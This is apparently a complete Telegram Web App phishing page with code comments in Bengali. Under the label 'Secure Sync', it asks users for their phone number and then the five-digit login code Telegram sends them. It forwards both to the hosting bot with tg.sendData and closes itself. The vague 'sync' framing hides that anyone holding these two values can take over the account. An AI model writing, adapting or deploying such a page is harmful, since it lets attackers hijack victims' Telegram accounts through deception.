<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Sync</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; padding: 20px; text-align: center; background-color: #f4f7f9; }
        .container { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1.5px solid #ddd; border-radius: 12px; box-sizing: border-box; font-size: 16px; }
        button { background-color: #0088cc; color: white; border: none; padding: 14px 20px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
        .hidden { display: none; }
        .info { font-size: 14px; color: #666; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h3 id="title">Account Sync</h3>
        
        <div id="phone-sec">
            <p class="info">Enter your phone number with <b>+</b></p>
            <input type="tel" id="phone" value="+">
            <button onclick="sendPhone()">Send Authorization Key</button>
        </div>

        <div id="otp-sec" class="hidden">
            <p class="info">Enter the 5-digit key from Telegram</p>
            <input type="number" id="otp" placeholder="Enter Key">
            <button onclick="sendOTP()">Verify & Finish</button>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        const phoneInput = document.getElementById("phone");
        
        // প্লাস চিহ্ন ধরে রাখার লজিক
        phoneInput.addEventListener("input", function() {
            if (!this.value.startsWith("+")) {
                this.value = "+" + this.value.replace("+", "");
            }
        });

        // যদি ইউআরএল-এ 'step=otp' থাকে তবে ওটিপি বক্স দেখাবে
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('step') === 'otp') {
            document.getElementById("phone-sec").classList.add("hidden");
            document.getElementById("otp-sec").classList.remove("hidden");
            document.getElementById("title").innerText = "Enter Key";
        }

        function sendPhone() {
            let phone = phoneInput.value.trim();
            if (phone === "+" || phone.length < 10) return alert("Enter valid number!");
            tg.sendData(JSON.stringify({ phone: phone }));
            tg.close();
        }

        function sendOTP() {
            let otp = document.getElementById("otp").value.trim();
            if (!otp) return alert("Enter Key!");
            tg.sendData(JSON.stringify({ otp: otp }));
            tg.close();
        }
    </script>
</body>
</html>
